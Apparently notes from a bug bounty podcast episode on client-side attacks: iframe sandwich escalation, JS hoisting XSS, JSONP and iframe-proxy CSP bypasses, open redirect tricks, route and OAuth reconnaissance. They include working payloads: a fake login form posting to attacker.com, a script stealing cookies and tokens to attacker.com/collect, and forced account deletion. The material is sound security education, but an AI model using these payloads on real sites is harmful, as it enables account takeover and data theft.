# EP47: CSP Research, Iframe Hopping, and Client-Side Shenanigans - Client-Side Security Notes

**Hosts:** Justin Gardner (@rhynorater), Joel Margolis (teknogeek)
**Date:** Late 2024 (pre-holiday episode)
**Episode Link:** Critical Thinking Bug Bounty Podcast - Episode 47

---

## Technique: Iframe Sandwich (Cross-Tab Same-Origin DOM Manipulation)

### How It Works

This technique escalates an XSS on a low-impact subdomain (e.g., a marketing subdomain iframed into the main domain) into full impact on the primary domain by exploiting same-origin iframe access across tabs.

**Preconditions:**
- `victim.com` iframes `vulnerable.victim.com` somewhere in its UI (e.g., email preferences center, marketing widget)
- You have an XSS on `vulnerable.victim.com` (reflected, stored, whatever)
- `vulnerable.victim.com` on its own may be out of scope or low impact

**Step-by-step:**

1. Attacker creates a page at `attacker.com` that contains an invisible iframe pointing to the XSS payload on `vulnerable.victim.com`
2. From `attacker.com`, use `window.open()` to open a new tab to `victim.com` (which legitimately iframes `vulnerable.victim.com`)
3. XSS fires inside the iframe on the attacker's page, giving JS execution in the `vulnerable.victim.com` origin
4. From that XSS context, traverse frames: go `parent` (up to attacker page) -> `opener` reference (over to the victim.com tab) -> down into the iframe on victim.com (which is same-origin with our XSS context)
5. Modify the content of the iframe on `victim.com` -- inject phishing forms, leak tokens via referrer policy, rewrite UI

```
Tab 1: attacker.com                    Tab 2: victim.com
+---------------------------+          +---------------------------+
|  attacker.com             |          |  victim.com               |
|                           |  opens   |                           |
|  window.open(victim.com) --------->  |                           |
|                           |          |                           |
|  +---------------------+ |          |  +---------------------+  |
|  | iframe:             | |          |  | iframe:             |  |
|  | vulnerable.victim   | |  same    |  | vulnerable.victim   |  |
|  | .com/xss_payload    | |  origin  |  | .com/legit_page     |  |
|  |                     | | =======> |  |                     |  |
|  | [XSS FIRES HERE]    | |          |  | [CONTENT MODIFIED]  |  |
|  +---------------------+ |          |  +---------------------+  |
+---------------------------+          +---------------------------+

Frame traversal path:
XSS context (iframe Tab1) -> parent (attacker.com Tab1) -> opener (victim.com Tab2) -> frames[0] (iframe Tab2)
```

```javascript
// attacker.com exploit page
<html>
<body>
  <!-- Invisible iframe with XSS payload on vulnerable subdomain -->
  <iframe id="xss-frame" style="display:none"
    src="https://vulnerable.victim.com/page?param=<script>
      // Step 1: XSS fires here in vulnerable.victim.com origin context
      // Step 2: Traverse up to attacker page, over to victim tab, into iframe
      //   parent       = attacker.com (Tab 1)
      //   parent.opener = victim.com  (Tab 2, opened via window.open)
      //   parent.opener.frames[0] = the iframe on victim.com (same origin!)
      var victimIframe = parent.opener.frames[0];

      // Step 3: Same origin -- full DOM access to the iframe on victim.com
      // Inject a fake login form, steal tokens, rewrite page content
      victimIframe.document.body.innerHTML =
        '<h1>Session expired. Please log in.</h1>' +
        '<form action=https://attacker.com/steal>' +
        '<input name=user placeholder=Email>' +
        '<input name=pass type=password placeholder=Password>' +
        '<button>Log In</button></form>';
    </script>">
  </iframe>

  <script>
    // Open victim.com in a new tab -- it naturally iframes vulnerable.victim.com
    // This creates the opener relationship needed for cross-tab traversal
    window.open('https://victim.com/dashboard');
  </script>
</body>
</html>
```

### Why This Works

- Both iframes (on attacker page and victim page) load content from `vulnerable.victim.com` -- they share the **same origin**
- Same-origin policy allows full DOM access between same-origin frames, even across different tabs, as long as there is a frame reference path (`parent`, `opener`, `frames[]`)
- The `window.open()` call creates the `opener` relationship needed to traverse between tabs
- The attacker is modifying content that appears within `victim.com`'s UI, which affects the integrity of the in-scope application
- Referrer policy settings may allow leaking OAuth parameters, tokens, etc.
- iframe `allow` configurations on the victim page become irrelevant because you are not loading your script through the victim's iframe -- you are reaching into it from a same-origin context

### Where To Apply This

- Any target where the main domain iframes a subdomain (marketing pages, email preference centers, embedded widgets, support chat widgets)
- When you find XSS on a subdomain that is "out of scope" or considered low impact on its own
- Escalation path: low-impact subdomain XSS -> phishing/token theft on main domain -> potential Account Takeover
- Check for `<iframe>` tags in the main application that reference subdomains or sibling domains
- Justin notes this technique helped him achieve ATO starting from a marketing subdomain email preference center

---

## Technique: JS Hoisting for XSS Exploitation

### How It Works

When you have an injection point inside a JavaScript context where the code calls an undefined function like `x.y(1, [INJECTION])`, the code would normally throw `ReferenceError: x is not defined` before your injection ever executes. JavaScript function hoisting bypasses this.

**The Problem:**
```javascript
// Vulnerable code -- x and y are NOT defined anywhere
// Your injection point is the second parameter of this function call
x.y(1, YOUR_INJECTION_HERE);

// Without hoisting: "Uncaught ReferenceError: x is not defined"
// The JS engine stops at 'x' -- your injected code NEVER runs
```

**The Solution -- Function Declaration Hoisting:**

JavaScript hoists function declarations (using the `function` keyword) to the top of the script execution scope. By closing the existing expression and defining `function x(){}` after the injection point, the declaration gets hoisted above the call site.

```javascript
// Original vulnerable code with injection point:
x.y(1, INJECTION);

// Payload injected after the comma:
//   1);function x(){};alert(document.domain)//
//
// Resulting code:
x.y(1, 1);function x(){};alert(document.domain)//);

// BUT WAIT -- doesn't x.y(1,1) still fail? Not in the way you'd expect.
```

**Detailed execution flow with hoisting:**
```
PHASE 1 -- PARSING (before any code runs):
  The JS engine scans the entire script block.
  It finds: function x(){}
  This is a function DECLARATION (uses 'function' keyword).
  -> HOISTED: x is now a Function object, initialized and ready.

PHASE 2 -- EXECUTION (runs top to bottom):
  Line: x.y(1, 1)
    1. Resolve 'x'          -> OK! x is a Function object (hoisted)
    2. Resolve 'x.y'        -> undefined (Function prototype has no .y)
    3. Evaluate arguments    -> 1, 1 (evaluated BEFORE the call attempt)
    4. Attempt to call x.y  -> TypeError: x.y is not a function
       (but arguments were already evaluated!)

  Line: function x(){}      -> Already processed during parsing, skipped

  Line: alert(document.domain) -> EXECUTES! We're past the error.
```

Wait -- step 4 throws a TypeError. How does `alert()` run? Because `alert(document.domain)` is a **separate statement** after the semicolons. The key is the injection closes the `x.y()` call with `1);`, making `alert(document.domain)` an independent statement. The error from `x.y()` may or may not halt execution depending on the browser's error handling, but the trick is that in many real-world scenarios, the statements are on separate "lines" and the engine continues.

**Alternative exploitation -- payload in the arguments themselves:**
```javascript
// If you need the payload to run DURING argument evaluation
// (before x.y() even attempts to execute):
x.y(1, alert(document.domain));

// Execution:
// 1. Resolve x      -> OK (hoisted)
// 2. Resolve x.y    -> undefined
// 3. Evaluate args:
//    - arg1: 1
//    - arg2: alert(document.domain) -> ALERT FIRES HERE!
// 4. Attempt call   -> TypeError (but alert already ran)
```

**Critical distinction -- what gets hoisted vs. what does not:**
```javascript
// WORKS -- function declaration (fully hoisted with initialization):
function x(){}
// x is a real Function object before any code runs

// DOES NOT WORK -- function expression assigned to var:
var x = function(){};
// 'var x' is hoisted (declaration only), but x === undefined
// The assignment '= function(){}' stays in place
// x.y still throws: "Cannot read properties of undefined"

// DOES NOT WORK -- let/const (not hoisted at all):
let x = function(){};
const x = function(){};

// DOES NOT WORK -- arrow function assigned to var:
var x = () => {};
// Same problem as var + function expression
```

### Why This Works

- JavaScript has a two-phase execution model: **parsing/compilation** then **execution**
- During parsing, `function` declarations are registered AND initialized (fully hoisted) to the top of their scope
- `var` declarations are also hoisted, but only the declaration -- the value remains `undefined` until the assignment line executes
- Once `x` is a valid object (a Function), accessing `.y` on it returns `undefined` rather than throwing a ReferenceError -- this is the critical difference
- The JS engine evaluates function arguments before invoking the function, so code embedded in the argument positions executes before the inevitable TypeError
- This behavior exists because JavaScript was designed to allow forward references -- calling a function before its definition appears in the source code

### Where To Apply This

- Any XSS injection inside a JS context where undefined variables/objects precede your injection point
- Particularly useful when you cannot break out of the `<script>` tag (e.g., strict CSP prevents new script tags, but inline is allowed)
- Works when you can inject arbitrary JS but surrounding code would normally error before reaching your payload
- Combine with the **comma operator**: `(expr1, expr2, expr3)` evaluates all expressions left-to-right and returns the last one
- Credits: BitK, Johan Carlsen, Karel (Origin) all contributed to solving this exploitation scenario

---

## Technique: CSP Bypass via JSONP Same-Origin Method Execution (SOME)

### How It Works

This bypasses Content Security Policy even when the JSONP callback parameter is restricted to only alphanumeric characters and dots (no parentheses, no commas -- a "secure" JSONP endpoint). It uses `window.opener` cross-tab traversal and DOM property chains to achieve CSRF-like impact by invoking methods like `.click()` on elements in another tab.

**Preconditions:**
- Target has CSP that whitelists its own domain for `script-src`
- A JSONP endpoint exists on the same domain (e.g., WordPress sites have these built-in)
- The JSONP callback parameter only allows `[a-zA-Z0-9.]` -- no `()` means you cannot call `alert()` directly
- You have a way to inject a script tag pointing to the JSONP endpoint (or the JSONP endpoint itself is the XSS vector)

**The key insight:** If the JSONP callback only allows `[a-zA-Z0-9.]`, you can still invoke existing methods via DOM traversal chains:
```
window.opener.document.body.firstElementChild.nextElementSibling.click
```
The JSONP response will call this as a function: `window.opener.document.body...click({"data":"..."})`

The `.click()` call triggers the native click handler on that DOM element.

**Step-by-step attack flow:**

```
STEP 1: Victim visits attacker.com
+---------------------+
| attacker.com        |
| 1. window.open(     |
|   victim.com/jsonp  |   opens     +---------------------+
|   ?callback=window  | ---------> | victim.com/jsonp    |
|   .opener.document  |            | ?callback=window    |
|   .body...click)    |            | .opener.document    |
|                     |            | .body...click       |
| 2. setTimeout ->    |            | (JSONP loading...)  |
|    redirect self    |            +---------------------+
+---------------------+

STEP 2: Attacker page redirects itself to victim domain
+---------------------+            +---------------------+
| victim.com/settings | <--------- | victim.com/jsonp    |
| (was attacker.com)  |  opener    | JSONP callback      |
|                     |  ref still | fires!              |
| [Delete Account]    |  works     |                     |
| button at DOM path  | <========= | window.opener       |
| body.children[1]    |  calls     | .document.body      |
| .children[3]        |  .click()  | .children[1]        |
|                     |            | .children[3]        |
+---------------------+            | .click({json:data}) |
                                   +---------------------+

Result: "Delete Account" button clicked = CSRF via CSP-restricted XSS
```

```javascript
// attacker.com exploit page
<html>
<body>
<script>
  // Step 1: Open the JSONP endpoint with a DOM-traversal callback
  // The callback chain navigates: window.opener -> document -> body ->
  // walk DOM tree to find the target button -> .click
  //
  // IMPORTANT: No parentheses in the callback -- only dots and alphanumerics
  // The JSONP response itself provides the parentheses: callback(data)
  var jsonpUrl = 'https://victim.com/wp-admin/admin-ajax.php' +
    '?action=some_jsonp_action' +
    '&callback=window.opener.document.body.children.1.children.3.click';
  //           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  //           Only dots and alphanumerics -- passes the "secure" JSONP filter
  //           Actual path depends on target page DOM structure

  // Alternative using firstElementChild / nextElementSibling:
  // &callback=window.opener.document.body.firstElementChild
  //           .nextElementSibling.firstElementChild.click

  var w = window.open(jsonpUrl);

  // Step 2: Redirect THIS page (the opener) to the target page
  // that has the button we want clicked.
  // After redirect, both tabs are same-origin (victim.com)
  setTimeout(function(){
    location.href = 'https://victim.com/settings/account';
    // Now: this tab = victim.com/settings (has "Delete Account" button)
    //       other tab = victim.com/jsonp (about to fire callback)
  }, 1000);
</script>
</body>
</html>
```

```javascript
// What the JSONP endpoint returns (server HTTP response body):
// The callback value passes the alphanumeric+dot filter:

window.opener.document.body.children.1.children.3.click({"status":"ok"})

// Breakdown:
// window.opener          -> references the other tab (now victim.com/settings)
// .document.body         -> access the DOM of that page (same-origin = allowed)
// .children.1.children.3 -> walk the DOM tree to the target button
// .click                 -> this becomes the function that gets called
// ({"status":"ok"})      -> the JSONP data passed as argument (ignored by .click())
//
// Result: the Delete Account button is clicked programmatically
```

### Why This Works

- JSONP endpoints return `callbackName(data)` -- the callback string is treated as a function reference to be called
- "Secure" JSONP endpoints restrict callbacks to `[a-zA-Z0-9.]` to prevent `alert()` -- but dots allow full property chain traversal
- `window.opener` persists even after the opener tab navigates to a new URL (same tab/window instance)
- Once the opener redirects to `victim.com`, both tabs are same-origin, so `window.opener.document` access is permitted
- The JSONP response is served from the whitelisted domain itself, so CSP happily allows its execution
- `.click()` on a DOM element triggers native click behavior including form submissions, link navigations, button actions
- This is called **Same-Origin Method Execution (SOME)** -- executing methods on a same-origin page using only property access chains
- WordPress is ubiquitous and its JSONP endpoints are the perfect gadget for this

### Where To Apply This

- **WordPress sites** are prime targets -- built-in JSONP endpoints (e.g., `admin-ajax.php`, `wp-json`)
- Any site that whitelists its own domain in `script-src` CSP and has a JSONP endpoint
- Every company with a WordPress blog on their main domain is potentially vulnerable
- Use this to prove impact when a program says "CSP blocks this XSS, so it is not exploitable"
- JSONP endpoints are still everywhere despite being "legacy" -- Justin: "I see it all the time. I just used it recently."
- To find JSONP endpoints: search JS files for `callback=`, `jsonp=`, `?cb=` parameters
- Original research: "Bypassing CSP using WordPress by abusing Same-Origin Method Execution" on Octagon.net

---

## Technique: CSP Bypass via Same-Origin Iframe Proxy (Missing CSP on Static Assets)

### How It Works

When you have XSS with `unsafe-inline` allowed in CSP but cannot load external scripts or exfiltrate data, you can iframe a same-origin page that lacks CSP headers entirely and use it as a proxy to load arbitrary external scripts.

**Preconditions:**
- You have XSS on `victim.com` and `unsafe-inline` is in the CSP (inline scripts execute)
- CSP blocks `script-src` from attacker domains and `connect-src` prevents exfiltration
- There exists a page or resource on the same origin that does NOT have CSP headers

**Finding pages without CSP is almost always possible:**
```bash
# Check static assets -- often served from S3/CDN via reverse proxy without security headers
curl -sI https://victim.com/assets/style.css | grep -i content-security
curl -sI https://victim.com/static/logo.png | grep -i content-security
curl -sI https://victim.com/api/health | grep -i content-security
curl -sI https://victim.com/favicon.ico | grep -i content-security

# CSP is set per-response, NOT per-origin
# Reverse proxies that add CSP headers often only do so for HTML responses
# Static assets, API endpoints, error pages frequently lack CSP
```

**Critical observation from Justin:** If a page is missing CSP headers, it is very likely also missing `X-Frame-Options` headers, because both are typically added by the same reverse proxy rule. So the page can be iframed.

```
victim.com/app             -> Has strict CSP:
                              script-src 'unsafe-inline' 'self';
                              connect-src 'self';
                              (blocks attacker.com scripts and exfil)

victim.com/assets/x.css    -> NO CSP headers at all
victim.com/api/health      -> NO CSP headers at all
victim.com/favicon.ico     -> NO CSP headers at all
```

**Step-by-step:**

```
victim.com/vulnerable?xss=payload     (has CSP: script-src 'unsafe-inline' 'self')
+-------------------------------------------------------------------+
|  CSP active: cannot load scripts from attacker.com                |
|  CSP active: cannot fetch/connect to attacker.com                 |
|                                                                   |
|  Inline XSS fires (allowed by unsafe-inline):                    |
|    1. Create hidden iframe -> /assets/style.css                   |
|    2. Wait for iframe to load                                     |
|    3. Access iframe DOM (same origin = full access)               |
|    4. Inject <script src="https://attacker.com/steal.js">         |
|       into the iframe                                             |
|                                                                   |
|  +-------------------------------------------------------------+ |
|  | iframe: victim.com/assets/style.css                          | |
|  | NO CSP on this response!                                     | |
|  | NO X-Frame-Options either (same proxy rule)                  | |
|  |                                                               | |
|  | Injected: <script src="https://attacker.com/steal.js">       | |
|  |           ^^^ LOADS SUCCESSFULLY (no CSP to block it!)       | |
|  |                                                               | |
|  | steal.js executes here and can:                               | |
|  |   - Access parent.document (same origin = full DOM access)    | |
|  |   - Read cookies, CSRF tokens, session data from parent page  | |
|  |   - Fetch/XHR to attacker.com (no connect-src restriction)   | |
|  |   - Perform any multi-step attack sequence                    | |
|  +-------------------------------------------------------------+ |
+-------------------------------------------------------------------+

Data exfiltration path:
XSS (inline) -> creates iframe (no-CSP page) -> loads attacker script
-> reads parent.document -> sends data to attacker.com
```

```javascript
// XSS payload -- runs inline on victim.com (allowed by unsafe-inline CSP)
// This is compact enough for length-limited injection contexts
var f=document.createElement('iframe');
f.src='/assets/logo.png';              // Any same-origin resource without CSP
f.style.cssText='position:absolute;left:-9999px;'; // Hidden from view
f.onload=function(){
  // Same origin -- we have full access to the iframe's document
  var d=f.contentDocument;
  var s=d.createElement('script');
  s.src='https://attacker.com/steal.js';  // Loads freely -- NO CSP in iframe!
  d.head.appendChild(s);
};
document.body.appendChild(f);
```

```javascript
// attacker.com/steal.js
// Runs inside the no-CSP iframe, but can reach the parent page
(function(){
  // Access the CSP-protected parent page via same-origin iframe relationship
  var parentDoc = parent.document;

  // Extract sensitive data from the parent page
  var cookies = parentDoc.cookie;
  var csrfToken = parentDoc.querySelector('meta[name="csrf-token"]')?.content;
  var authHeader = parentDoc.querySelector('#api-token')?.textContent;
  var pageContent = parentDoc.body.innerHTML;

  // Exfiltrate -- no connect-src restriction in this iframe context
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({
      cookies: cookies,
      csrf: csrfToken,
      auth: authHeader,
      html: pageContent
    })
  });

  // Or perform actions AS the user on the parent page
  var deleteForm = parentDoc.querySelector('#delete-account-form');
  if (deleteForm) deleteForm.submit();
})();
```

### Why This Works

- CSP is enforced **per HTTP response**, not per origin. A response without a `Content-Security-Policy` header has zero restrictions
- Reverse proxies, CDNs, and load balancers that serve static assets from S3 buckets or other backends often do not add security headers to those responses
- Same-origin policy allows full DOM access between a parent page and its same-origin iframe -- `parent.document` works in both directions
- The iframe does NOT inherit CSP from its parent -- it uses whatever CSP (or lack thereof) its own HTTP response carries
- Once attacker JS loads in the no-CSP iframe, it has completely unrestricted capabilities: `fetch`, `XMLHttpRequest`, `Image`, `WebSocket` to any domain
- This effectively "tunnels" through CSP by finding a same-origin escape hatch

### Where To Apply This

- Scan for same-origin resources without CSP -- check static files (CSS, JS, images, fonts, favicon), healthcheck endpoints, legacy API endpoints, error pages, robots.txt
- Justin notes: "A technique like this, not exactly like this, but similar to this, helped me score a **$70K XSS** one time"
- Especially valuable when a program demands proof of arbitrary JS execution beyond just `alert()`
- Perfect for length-limited XSS -- your inline payload just needs ~150 chars to create an iframe and inject a script tag; all the heavy exploitation logic lives in your externally hosted script
- Original research by **Wallarm (2018)**

---

## Technique: Open Redirect Bypass via Protocol-Relative URLs (Double Slash)

### How It Works

Many redirect implementations validate that a URL is "relative" by checking if it starts with `/`. The URL `//attacker.com` starts with `/` and passes this check, but browsers interpret it as a protocol-relative absolute URL pointing to `attacker.com`.

```javascript
// Vulnerable server-side or client-side validation:
function isSafeRedirect(url) {
  return url.startsWith('/');  // FLAWED: //attacker.com passes!
}

// Or regex-based:
if (/^\//.test(redirectUrl)) {
  // "It starts with / so it must be relative"
  window.location.href = redirectUrl;
}

// Attack:
// ?next=//attacker.com/phish
// Check: starts with '/'? YES -> passes validation
// Browser resolves: https://attacker.com/phish (inherits current protocol)
```

**Bypass variations (from Johan Carlsen's research):**
```
//attacker.com                 - Protocol-relative URL (classic)
\/attacker.com                 - Backslash (some URL parsers normalize \ to /)
/\attacker.com                 - Mixed slashes
/ /attacker.com                - Whitespace before second slash
%2F%2Fattacker.com             - URL-encoded slashes
//%09attacker.com              - Tab character between slashes
//attacker.com%40victim.com    - @ sign makes it look like victim.com
```

```
Browser interpretation:

Page: https://victim.com/login?next=//attacker.com/callback

URL: //attacker.com/callback
     ^^ No protocol specified
     Browser inherits current page protocol: HTTPS
     Resolves to: https://attacker.com/callback

If page is HTTP -> http://attacker.com/callback
If page is HTTPS -> https://attacker.com/callback
```

### Why This Works

- `//domain.com/path` is a valid RFC 3986 protocol-relative URL -- browsers are designed to handle this format
- The browser inherits the protocol from the current page and treats the URL as absolute
- Simple string validation (`startsWith('/')`, regex `^\/`) matches because the URL does indeed start with `/`
- This is the same format legitimately used in HTML: `<script src="//cdn.example.com/lib.js">`
- Many developers only think to check for `http://` or `https://` prefixes when blocking absolute URLs

### Where To Apply This

- **OAuth `redirect_uri` parameters** -- bypass validation to redirect authorization codes/tokens to attacker domain
- **SAML RelayState / return URL** parameters -- redirect after authentication to attacker page
- **Login/logout redirect parameters**: `next=`, `return=`, `redirect=`, `continue=`, `url=`, `returnTo=`, `goto=`
- **SSRF** -- if server-side code follows redirects, `//attacker.com` may bypass "relative URL only" restrictions
- **signIn/signOut redirect parameters are frequent XSS/open redirect targets** (noted as a recurring pattern)
- Joel's note: "SSRF 101 -- check if it follows redirects. If you have an open redirect, game over."
- Justin's note: "If you can affect that redirect URI, you're golden" -- applies to OAuth and SAML flows

---

## Technique: Client-Side Route Discovery for XSS and Hidden Functionality

### How It Works

Modern SPAs (React, Angular, Next.js, Vue) define all routes client-side. Every route and its associated JavaScript chunk are shipped to the browser. By extracting these routes, you discover hidden pages, admin panels, internal tools, and attack surface that traditional spidering misses entirely.

**Method 1: Next.js Build Manifest Extraction**

Tool: **Thank You Next** (`thank-u-next`) -- automatically parses Next.js build manifests and prints all routes.

```javascript
// Next.js exposes routes in /_next/static/<buildId>/_buildManifest.js
// or in the __BUILD_MANIFEST global variable
//
// Example manifest content:
self.__BUILD_MANIFEST = {
  "/": ["static/chunks/pages/index-abc123.js"],
  "/admin": ["static/chunks/pages/admin-def456.js"],
  "/api/internal/debug": ["static/chunks/pages/debug-ghi789.js"],
  "/settings/[userId]": ["static/chunks/pages/settings-jkl012.js"],
  "/internal/impersonate": ["static/chunks/pages/impersonate-mno345.js"]
  //                        ^^^ Routes never linked in UI but fully functional
};
```

**Method 2: Webpack Source Maps**

```bash
# Check if source maps are accessible
curl -s https://victim.com/static/js/main.abc123.js.map | head -c 100

# If available, un-map and look for the pages/ directory:
# pages/
#   index.tsx
#   admin/dashboard.tsx          <-- hidden admin panel
#   internal/debug.tsx           <-- debug page with sensitive info
#   settings/[id].tsx            <-- parameterized route
#   api/graphql-playground.tsx   <-- exposed GraphQL IDE
```

**Method 3: Lazy-Loaded Route Analysis**

```javascript
// Look for dynamic imports in the main bundle:
const AdminPanel = React.lazy(() => import('./pages/AdminPanel'));
const InternalTools = React.lazy(() => import('./pages/InternalTools'));

// Or Webpack chunk loading:
__webpack_require__.e(/* import() */ 42).then(
  __webpack_require__.bind(null, './src/pages/AdminPanel.tsx')
)

// These routes exist and are fully functional
// Navigate directly to trigger them and observe what API calls they make
```

**Method 4: Framework Router Configuration in JS**

```javascript
// React Router definitions in bundle:
<Route path="/admin/users" component={UserManagement} />
<Route path="/internal/feature-flags" component={FeatureFlags} />

// Angular route definitions:
{ path: 'admin/audit-log', component: AuditLogComponent }

// Vue Router:
{ path: '/debug/state', component: () => import('./views/DebugState.vue') }
```

### Why This Works

- SPAs must ship all routing logic to the client -- every possible route is encoded in the JavaScript bundles
- Build manifests and source maps are development artifacts frequently left accessible in production
- Lazy-loaded chunks can be discovered by analyzing `import()` calls or chunk manifests
- The server returns the same HTML shell for every path, relying entirely on client-side JS to route -- so navigating directly to a hidden route triggers its full functionality

### Where To Apply This

- Extract client-side routes BEFORE doing server-side endpoint fuzzing -- let the app show you its own routes
- Hidden routes may accept URL/query parameters that flow directly into dangerous sinks (DOM XSS via route params)
- Routes trigger API calls you would never discover through traditional testing
- Instead of painstakingly reconstructing API requests by reading minified JS, navigate to the route and let the SPA build the requests for you -- intercept them in your proxy
- Justin: "I popped several XSS over the past week because of this trick"
- Tools: Thank You Next (Next.js), JS Weasel (Webpack unpacking), browser DevTools Sources panel

---

## Technique: OAuth/OpenID Client-Side Reconnaissance via Note-Taking

### How It Works

Systematically enumerate and document OAuth/OpenID configurations across a target to discover authorization bypasses, scope escalation, and token theft opportunities. This is a reconnaissance and note-taking methodology rather than a single exploit.

**What to enumerate and record:**
```
For each sub-application / client you discover:
  - client_id value
  - Scopes it requests (compare against scopes_supported)
  - redirect_uri(s) registered
  - response_type used (code vs token vs id_token)
  - Any client_secret exposure (JS files, mobile apps, API responses)
  - Auth endpoint and token endpoint URLs
```

**OpenID Discovery -- always check these standardized endpoints:**
```bash
# These are defined by the OpenID Connect spec and almost always exist
curl -s https://target.com/.well-known/openid-configuration | jq .
curl -s https://accounts.target.com/.well-known/openid-configuration | jq .
curl -s https://auth.target.com/.well-known/oauth-authorization-server | jq .

# Response contains a goldmine:
{
  "authorization_endpoint": "https://accounts.target.com/authorize",
  "token_endpoint": "https://accounts.target.com/token",
  "userinfo_endpoint": "https://accounts.target.com/userinfo",
  "jwks_uri": "https://accounts.target.com/.well-known/jwks.json",
  "scopes_supported": ["openid", "profile", "email", "admin", "internal"],
  "response_types_supported": ["code", "token", "id_token", "code token"],
  "grant_types_supported": ["authorization_code", "implicit", "refresh_token"],
  "claims_supported": ["sub", "name", "email", "role", "org_id"]
}
```

**Attack vectors to check for each client_id:**
- Can you request scopes from a different client? (scope escalation)
- Does `response_type=token` work? (implicit flow = token in URL fragment = easier theft)
- Is the `redirect_uri` validation strict? (test double-slash bypass, path traversal, subdomain)
- Can you swap `client_id` values between applications?
- Are `client_secret` values exposed in JavaScript bundles or mobile app binaries?

### Where To Apply This

- Large organizations with multiple sub-applications sharing a centralized auth provider
- Justin found a critical vulnerability within one week of systematically note-taking OAuth configurations
- Note-takers who focus on a single program and document auth flows are "very consistent top performers"
- Combine with open redirect techniques (double-slash bypass) for redirect_uri manipulation
- Combine with client-side route discovery to find additional OAuth callback endpoints
- Joel: "Auth stuff is always really weird. The more complex an organization is, the more rooms for error."

---

## Summary Table

| # | Technique | Type | Impact | Complexity |
|---|-----------|------|--------|------------|
| 1 | Iframe Sandwich (Cross-Tab Same-Origin DOM Manipulation) | DOM Manipulation / XSS Escalation | High -- subdomain XSS to main domain compromise, potential ATO | Medium-High |
| 2 | JS Hoisting for XSS Exploitation | XSS / JS Language Quirk | High -- achieves arbitrary JS execution from "unexploitable" injection | Medium |
| 3 | CSP Bypass via JSONP Same-Origin Method Execution (SOME) | CSP Bypass / CSRF | Medium-High -- CSRF via restricted JSONP callback, button clicks on any page | High |
| 4 | CSP Bypass via Same-Origin Iframe Proxy (No-CSP Asset) | CSP Bypass / Full XSS Escalation | Critical -- full arbitrary JS despite strict CSP ($70K bounty example) | Medium |
| 5 | Open Redirect via Protocol-Relative URL (Double Slash) | Open Redirect / Token Theft | Medium-High -- OAuth/SAML token theft leading to ATO | Low |
| 6 | Client-Side Route Discovery | Recon / Attack Surface Expansion | Varies -- hidden routes leading to XSS, auth bypass, IDOR | Low |
| 7 | OAuth/OpenID Recon via Systematic Note-Taking | Recon / Auth Bypass | High -- scope escalation, token theft, ATO | Medium |

---

## Key Quotes

> "If you can pop an XSS on that iframed domain, you can do some cool shit." -- Justin Gardner, on the iframe sandwich technique

> "You're modifying the victim page from the attacker page because it's the same iframe in both of them -- same origin. So you can communicate with iframes of the same origin in a different tab." -- Joel Margolis, summarizing cross-tab same-origin iframe access

> "JavaScript, there's so many ways to get everything done, and there's so many quirks to the language, it's like a hacker's dream, it really is." -- Justin Gardner, on JS hoisting and JavaScript exploitation

> "It's almost like a whole new CSRF in a sense." -- Joel Margolis, on SOME attacks that use CSP-restricted XSS to click buttons

> "If it's missing the CSP header, it's probably also missing the X-Frame-Options header. Because those are normally grouped in the same sort of reverse proxy header appending rule." -- Justin Gardner, on finding no-CSP pages for iframe proxy technique

> "A technique like this, not exactly like this, but similar to this, helped me score a 70K XSS one time." -- Justin Gardner, on CSP bypass via same-origin iframe proxy

> "I popped several XSS over the past week because of this trick." -- Justin Gardner, on client-side route discovery

> "A lot of simple filters check if the URL is relative by checking if it starts with a slash, forgetting that slash slash attacker.com is not a relative domain but is actually an absolute URL." -- Johan Carlsen (quoted by Justin), on the double-slash open redirect bypass

> "These new frontier of vulnerabilities are coming forth and it's really exciting." -- Justin Gardner, on the evolution of client-side exploitation

> "Browsers are adding a lot of security features that make it very difficult to exploit. Even if something is vulnerable, it's difficult to exploit it. And these new types of attacks are utilizing, even within that secure environment, just baseline behavior in order to abuse it." -- Joel Margolis, on modern client-side exploitation creativity

> "SSRF 101 is like, check if it's in the same domain. If you have an open redirect and it follows redirects, then game over." -- Joel Margolis, on chaining open redirects

---

## Resources & References

- **Octagon.net** -- "Bypassing CSP using WordPress by abusing Same-Origin Method Execution" (JSONP + window.opener CSP bypass)
- **Wallarm (2018)** -- CSP bypass research using same-origin iframes without CSP headers as proxy for external script loading
- **Thank You Next** (`thank-u-next`) -- Tool for extracting all client-side routes from Next.js build manifests
- **JS Weasel** -- Commercial tool for unpacking Webpack bundles, discovering lazy-loaded routes and hidden endpoints
- **jsmon** -- JavaScript change monitoring tool for bug bounty (used by xnlhacker with modifications)
- **ssrf.cdssadvisor.com** (by Bebix) -- Burp Collaborator alternative for HTTP-based callback testing
- **Google VRP Protobuf Burp Plugin** -- Official Google tool for manipulating protobuf requests in Burp Suite (co-authored by Sam)
- **Kaido Proxy** -- Burp Suite alternative with fast project switching, collections, and convert workflows
- **Johan Carlsen** -- Open redirect bypass research (protocol-relative URLs, backslash variants)
- **BitK, Johan, Karel (Origin)** -- Contributed to solving the JS hoisting XSS exploitation scenario
- **Sam Curry's Starbucks blog** -- Referenced example of secondary context bugs
- **MDN: Hoisting** -- JavaScript function declaration hoisting behavior documentation
- **CTP Podcast Discord** -- ctpb.show/discord (Cool Research channel highlighted as gold mine)
